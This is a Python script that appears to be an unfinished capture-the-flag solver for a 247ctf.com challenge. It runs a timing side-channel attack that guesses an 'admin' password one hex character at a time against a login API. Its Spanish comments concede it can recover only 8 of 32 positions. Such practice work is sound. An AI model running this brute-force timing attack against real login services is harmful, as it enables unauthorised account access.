#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    try:
        resp = requests.post(
            f"{BASE_URL}/api/login",
            data={
                "username": username,
                "password": password,
                "api": api_token
            },
            timeout=10
        )
        elapsed = time.time() - start
        return resp.json(), elapsed
    except:
        return {"result": "error"}, 0

def get_flag(password):
    try:
        resp = requests.post(
            f"{BASE_URL}/api/get_flag",
            data={"password": password},
            timeout=10
        )
        return resp.json()
    except:
        return {"result": "error"}

# Estrategia: con 128 requests, hacer 1 medición por carácter
# Eso me da 128/16 = 8 posiciones por token
# Necesito 4 tokens para 32 posiciones

api_token = get_token()
known = ""

# Hacer solo 1 medición por carácter, cubrir tantas posiciones como sea posible
positions_covered = 0
max_positions = 128 // 16  # 8 posiciones con 1 medición cada una

for pos in range(max_positions):
    timings = {}
    
    for char in HEX_CHARS:
        test_password = known + char + "0" * (31 - len(known))
        result, elapsed = try_password("admin", test_password, api_token)
        
        if result.get("result") == "success":
            # ¡Login exitoso!
            flag_result = get_flag(test_password)
            if "flag" in str(flag_result).lower():
                print(flag_result.get("flag", flag_result))
                exit(0)
        
        timings[char] = elapsed
    
    # Elegir el carácter con mayor tiempo
    best_char = max(timings.items(), key=lambda x: x[1])[0]
    known += best_char

print(f"Contraseña parcial (primeras 8 posiciones): {known}")

# Para las siguientes posiciones, necesitaría nuevos tokens, pero eso resetea la contraseña
# Esto no funcionará...
print("No se puede continuar sin resetear la contraseña")
